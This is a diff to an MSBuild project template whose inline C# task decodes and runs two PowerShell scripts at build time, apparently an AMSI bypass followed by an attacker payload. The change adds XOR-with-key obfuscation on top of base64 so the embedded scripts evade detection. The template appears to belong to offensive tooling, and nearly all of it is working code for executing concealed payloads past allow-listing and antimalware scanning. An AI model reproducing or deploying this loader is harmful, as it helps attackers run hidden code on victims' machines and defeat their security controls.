@@ -11,6 +11,7 @@
       <Code Type="Class" Language="cs">
         <![CDATA[
 			using System;
+			using System.Text;
 			using System.Collections.ObjectModel;
 			using System.Management.Automation;
 			using System.Management.Automation.Runspaces;
@@ -21,14 +22,15 @@
 			{
 				public override bool Execute()
 				{
-          string ampsee = "~~AMSI~~";
-				  string cmnd = "~~SCRIPT~~";
+					string ampsee = "~~AMSI~~";
+					string cmnd = "~~SCRIPT~~";
+					string key = "~~KEY~~";
 
 					PowerShell p = PowerShell.Create();
-					p.AddScript(b64d(ampsee));
+					p.AddScript(System.Text.Encoding.UTF8.GetString(Zor(Convert.FromBase64String(ampsee), Encoding.UTF8.GetBytes(key))));
 					p.Invoke();
 
-					p.AddScript(b64d(cmnd));
+					p.AddScript(System.Text.Encoding.UTF8.GetString(Zor(Convert.FromBase64String(cmnd), Encoding.UTF8.GetBytes(key))));
 					Collection<PSObject> output = null;
 					output = p.Invoke();
 
@@ -42,8 +44,14 @@
 					catch(Exception e){}
 					return true;
 				}
-				public static string b64d(string text) {
-				return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(text));
+				private static byte[] Zor(byte[] input, byte[] key)
+				{
+					byte[] mixed = new byte[input.Length];
+					for (int i = 0; i < input.Length; i++)
+					{
+						mixed[i] = (byte)(input[i] ^ key[i % key.Length]);
+					}
+					return mixed;
 				}
 			}
         ]]>
@@ -51,3 +59,4 @@
     </Task>
   </UsingTask>
 </Project>
+
